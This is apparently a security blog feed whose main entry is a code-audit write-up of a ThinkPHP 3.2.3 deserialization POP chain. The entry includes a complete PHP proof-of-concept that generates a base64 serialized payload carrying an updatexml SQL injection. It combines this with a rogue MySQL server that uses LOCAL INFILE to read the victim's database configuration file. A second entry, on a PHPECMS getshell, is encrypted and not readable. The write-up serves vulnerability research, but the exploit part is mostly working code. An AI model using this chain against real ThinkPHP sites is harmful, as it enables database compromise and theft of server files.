    <content type="html"><![CDATA[<h1 id="TP3-0反序列化POP链-MySQL伪造恶意服务端">TP3.0反序列化POP链+MySQL伪造恶意服务端</h1><blockquote><p>Reference: 米斯特安全团队 <a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p></blockquote><h2 id="测试环境">测试环境</h2><ul><li>OS: <code>MAC OS</code></li><li>PHP: <code>5.6.40</code></li><li>ThinkPHP: <code>3.2.3</code></li></ul><h2 id="环境搭建">环境搭建</h2><p>使用composer拉取源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink&#x2F;thinkphp&#x3D;3.2.3 tp3</span><br></pre></td></tr></table></figure><p>框架会生成一个默认的控制器，访问首页显示<code>欢迎使用ThinkPHP！</code>。</p><p>更改这个默认的控制器：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120114943.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120115003.png" alt=""></p><h2 id="POP链分析">POP链分析</h2><h3 id="起点">起点</h3><p>文件：<code>/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120115132.png" alt=""></p><p><code>img</code>参数可控，这里有两个思路，一是可以接着寻找<code>destroy()</code>函数，二是可以寻找不存在<code>destroy()</code>函数的类从而触发<code>__call()</code>方法。</p><h3 id="跳板1">跳板1</h3><p>首先还是全局查找<code>function destroy(</code>，找到一个可用的跳板类。</p><p>文件：<code>/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120115536.png" alt=""></p><p>这里的<code>$this-&gt;handle</code>可控，并且调用了<code>$this-&gt;handle</code>的<code>delete()</code>方法，且传过去的参数是部分可控的，因此我们可以继续寻找有<code>delete()</code>方法的跳板类。</p><p>有点问题的地方在于这里的<code>destroy()</code>方法需要传入一个<code>$sessID</code>，但是前面<code>Imagick::__destruct</code>中调用<code>destroy()</code>方法的时候并没有传值，在PHP7的版本下会抛出异常。</p><h3 id="跳板2">跳板2</h3><p>全局搜索<code>function delete(</code>，找到一个<code>Model</code>类。</p><p>文件：<code>/ThinkPHP/Library/Think/Model.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params">$options = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $pk = <span class="keyword">$this</span>-&gt;getPk();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($options) &amp;&amp; <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 如果删除条件为空 则删除当前数据对象所对应的记录</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[$pk])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;delete(<span class="keyword">$this</span>-&gt;data[$pk]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($options) || is_string($options)) &#123;</span><br><span class="line">            <span class="comment">// 根据主键删除记录</span></span><br><span class="line">            <span class="keyword">if</span> (strpos($options, <span class="string">&#x27;,&#x27;</span>)) &#123;</span><br><span class="line">                $where[$pk] = <span class="keyword">array</span>(<span class="string">&#x27;IN&#x27;</span>, $options);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $where[$pk] = $options;</span><br><span class="line">            &#125;</span><br><span class="line">            $options          = <span class="keyword">array</span>();</span><br><span class="line">            $options[<span class="string">&#x27;where&#x27;</span>] = $where;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 根据复合主键删除记录</span></span><br><span class="line">        <span class="keyword">if</span> (is_array($options) &amp;&amp; (count($options) &gt; <span class="number">0</span>) &amp;&amp; is_array($pk)) &#123;</span><br><span class="line">            $count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (array_keys($options) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_int($key)) &#123;</span><br><span class="line">                    $count++;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (count($pk) == $count) &#123;</span><br><span class="line">                $i = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">foreach</span> ($pk <span class="keyword">as</span> $field) &#123;</span><br><span class="line">                    $where[$field] = $options[$i];</span><br><span class="line">                    <span class="keyword">unset</span>($options[$i++]);</span><br><span class="line">                &#125;</span><br><span class="line">                $options[<span class="string">&#x27;where&#x27;</span>] = $where;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 分析表达式</span></span><br><span class="line">        $options = <span class="keyword">$this</span>-&gt;_parseOptions($options);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array($options[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($options[<span class="string">&#x27;where&#x27;</span>][$pk])) &#123;</span><br><span class="line">            $pkValue = $options[<span class="string">&#x27;where&#x27;</span>][$pk];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;_before_delete($options)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;db-&gt;delete($options);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== $result &amp;&amp; is_numeric($result)) &#123;</span><br><span class="line">            $data = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($pkValue)) &#123;</span><br><span class="line">                $data[$pk] = $pkValue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_after_delete($data, $options);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回删除记录个数</span></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>$pk</code>其实就是<code>$this-&gt;pk</code>，是完全可控的。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120120035.png" alt=""></p><p>首先来看第一个if语句，<code>$options</code>是从跳板1传过来的，在跳板1中可以控制其是否为空。<code>$this-&gt;options['where']</code>是成员属性，是可控的，而且嵌套的if语句中<code>data</code>参数也是可控的，那么符合条件后，又调用了一次自己<code>$this-&gt;delete()</code>，但是这时候的参数<code>$this-&gt;data[$pk]</code>是我们可控的。</p><p>这时<code>delete()</code>我们就可以成功带完全可控参数访问了。</p><p>最终这个函数会调用具体数据库驱动类中的<code>delete()</code>中去，即：<code>$result = $this-&gt;db-&gt;delete($options);</code>，那么这时候我们就可以调用任意自带的数据库类中的<code>delete()</code>方法了。</p><h3 id="终点">终点</h3><p>文件：<code>/ThinkPHP/Library/Think/Db/Driver.class.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120121706.png" alt=""></p><p><code>$table</code>是可控的，将<code>$table</code>拼接到<code>$sql</code>传入了<code>$this-&gt;execute()</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$str, $fetchSql = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initConnect(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_linkID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;queryStr = $str;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;bind)) &#123;</span><br><span class="line">            $that           = <span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queryStr = strtr(<span class="keyword">$this</span>-&gt;queryStr, array_map(<span class="function"><span class="keyword">function</span> (<span class="params">$val</span>) <span class="title">use</span> (<span class="params">$that</span>) </span>&#123;<span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span> . $that-&gt;escapeString($val) . <span class="string">&#x27;\&#x27;&#x27;</span>;&#125;, <span class="keyword">$this</span>-&gt;bind));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($fetchSql) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;queryStr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//释放前次的查询结果</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;PDOStatement)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;free();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;executeTimes++;</span><br><span class="line">        N(<span class="string">&#x27;db_write&#x27;</span>, <span class="number">1</span>); <span class="comment">// 兼容代码</span></span><br><span class="line">        <span class="comment">// 记录开始执行时间</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;debug(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;PDOStatement = <span class="keyword">$this</span>-&gt;_linkID-&gt;prepare($str);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;PDOStatement) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;bind <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($val)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;PDOStatement-&gt;bindValue($key, $val[<span class="number">0</span>], $val[<span class="number">1</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;PDOStatement-&gt;bindValue($key, $val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bind = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;PDOStatement-&gt;execute();</span><br><span class="line">            <span class="comment">// 调试结束</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;debug(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">false</span> === $result) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;numRows = <span class="keyword">$this</span>-&gt;PDOStatement-&gt;rowCount();</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^\s*(INSERT\s+INTO|REPLACE\s+INTO)\s+/i&quot;</span>, $str)) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;lastInsID = <span class="keyword">$this</span>-&gt;_linkID-&gt;lastInsertId();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;numRows;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\PDOException $e) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>函数开头第一行先调用<code>initConnect()</code>初始化数据库连接：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120122004.png" alt=""></p><p>可以通过控制成员属性，使程序调用到<code>$this-&gt;connect()</code>。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120122054.png" alt=""></p><p>通过<code>$this-&gt;config</code>里的配置去创建了数据库连接，接着去执行前面拼接的<code>DELETE</code>SQL语句。</p><p>所以这条POP链的功能就在于可以连接任意数据库，再利用delete注入。</p><h2 id="漏洞利用">漏洞利用</h2><p>这个POP链看起来比较鸡肋，因为必须先拿到数据库的配置文件才能注入。但是在MySQL攻击面这篇文章，第一种攻击面就是<strong>读取客户端任意文件</strong>，前提就是伪造一个恶意的MySQL服务端。那么我就可以先把配置文件写成恶意的MySQL服务端，再读取客户端的数据库配置文件，最后通过这个配置文件进行delete注入。</p><h3 id="恶意MySQL服务端">恶意MySQL服务端</h3><p><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120140208.png" alt=""></p><h3 id="POC">POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> $config = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;type&#x27;</span>           =&gt; <span class="string">&#x27;mysql&#x27;</span>, <span class="comment">// 数据库类型</span></span><br><span class="line">            <span class="string">&#x27;hostname&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">// 服务器地址</span></span><br><span class="line">            <span class="string">&#x27;database&#x27;</span>       =&gt; <span class="string">&#x27;tp3&#x27;</span>, <span class="comment">// 数据库名</span></span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>       =&gt; <span class="string">&#x27;root&#x27;</span>, <span class="comment">// 用户名</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>       =&gt; <span class="string">&#x27;root&#x27;</span>, <span class="comment">// 密码</span></span><br><span class="line">            <span class="string">&#x27;hostport&#x27;</span>       =&gt; <span class="string">&#x27;3307&#x27;</span>, <span class="comment">// 端口</span></span><br><span class="line">            <span class="string">&#x27;dsn&#x27;</span>            =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//</span></span><br><span class="line">            <span class="string">&#x27;params&#x27;</span>         =&gt; <span class="keyword">array</span>(), <span class="comment">// 数据库连接参数</span></span><br><span class="line">            <span class="string">&#x27;charset&#x27;</span>        =&gt; <span class="string">&#x27;utf8&#x27;</span>, <span class="comment">// 数据库编码默认采用utf8</span></span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">// 数据库表前缀</span></span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>          =&gt; <span class="literal">false</span>, <span class="comment">// 数据库调试模式</span></span><br><span class="line">            <span class="string">&#x27;deploy&#x27;</span>         =&gt; <span class="number">0</span>, <span class="comment">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span></span><br><span class="line">            <span class="string">&#x27;rw_separate&#x27;</span>    =&gt; <span class="literal">false</span>, <span class="comment">// 数据库读写是否分离 主从式有效</span></span><br><span class="line">            <span class="string">&#x27;master_num&#x27;</span>     =&gt; <span class="number">1</span>, <span class="comment">// 读写分离后 主服务器数量</span></span><br><span class="line">            <span class="string">&#x27;slave_no&#x27;</span>       =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">// 指定从服务器序号</span></span><br><span class="line">            <span class="string">&#x27;db_like_fields&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> $options   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $data = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $db = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handle;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Image</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $img;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120143657.png" alt=""></p><p>然后发送请求，可以在mysql.log中看到读取的文件信息：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120143611.png" alt=""></p><p>接下来就是更改POC中数据库的相关配置为mysql.log中读取的到的内容即可。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120143910.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;TP3-0反序列化POP链-MySQL伪造恶意服务端&quot;&gt;TP3.0反序列化POP链+MySQL伪造恶意服务端&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Reference: 米斯特安全团队 &lt;a href=&quot;https://mp.weixin.qq.com/s/S
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>PHPECMSv3.5getshell</title>
    <link href="http://ca0y1h.top/code_audit/PHP/10.PHPECMS3.5getshell/"/>
    <id>http://ca0y1h.top/code_audit/PHP/10.PHPECMS3.5getshell/</id>
    <published>2021-01-10T03:27:32.000Z</published>
    <updated>2021-01-10T03:33:41.012Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ee5df1625aab02c528f1023c4be7accb06825ca117cf20e9a80a9598cce2b731"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Python反序列化漏洞</title>
    <link href="http://ca0y1h.top/Python/pysec/3.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://ca0y1h.top/Python/pysec/3.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-01-03T13:19:56.000Z</published>
    <updated>2021-01-03T13:20:48.706Z</updated>
    
